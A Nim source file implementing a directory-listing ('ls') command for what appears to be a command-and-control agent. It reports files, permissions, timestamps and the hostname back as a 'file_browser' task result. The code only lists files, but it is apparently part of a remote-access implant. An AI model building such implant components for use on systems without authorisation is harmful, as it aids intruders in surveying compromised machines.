import std/[os, json, strutils, times]
import core/types, core/utils
import commands/registry

proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
               send: SendMsg): TaskResult =
  var path = params{"path"}.getStr(".")
  if path.len == 0: path = "."
  let fullPath = if isAbsolute(path): path else: state.cwd / path

  try:
    let dirInfo = getFileInfo(fullPath)
    let files   = newJArray()

    for kind, entry in walkDir(fullPath):
      let info   = getFileInfo(entry)
      let isFile = kind in {pcFile, pcLinkToFile}
      var perms: string
      when not defined(windows):
        let m = info.permissions
        perms = (if fpUserRead    in m: "r" else: "-") &
                (if fpUserWrite   in m: "w" else: "-") &
                (if fpUserExec    in m: "x" else: "-") &
                (if fpGroupRead   in m: "r" else: "-") &
                (if fpGroupWrite  in m: "w" else: "-") &
                (if fpGroupExec   in m: "x" else: "-") &
                (if fpOthersRead  in m: "r" else: "-") &
                (if fpOthersWrite in m: "w" else: "-") &
                (if fpOthersExec  in m: "x" else: "-")
      else:
        perms = if isFile: "rw-r--r--" else: "rwxr-xr-x"

      files.add(%*{
        "is_file":     isFile,
        "permissions": {"permissions": perms},
        "name":        lastPathPart(entry),
        "access_time": info.lastAccessTime.toUnix(),
        "modify_time": info.lastWriteTime.toUnix(),
        "size":        if isFile: info.size else: 0,
      })

    let fileBrowser = %*{
      "host":           getHostname(),
      "is_file":        false,
      "permissions":    newJObject(),
      "name":           lastPathPart(fullPath),
      "parent_path":    parentDir(fullPath),
      "success":        true,
      "access_time":    dirInfo.lastAccessTime.toUnix(),
      "modify_time":    dirInfo.lastWriteTime.toUnix(),
      "size":           0,
      "update_deleted": true,
      "files":          files,
    }

    return TaskResult(
      output:      $(%*{"file_browser": fileBrowser}),
      status:      "success",
      completed:   true,
      extraFields: %*{"file_browser": fileBrowser},
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initLs*() =
  register("ls", lsExecute)
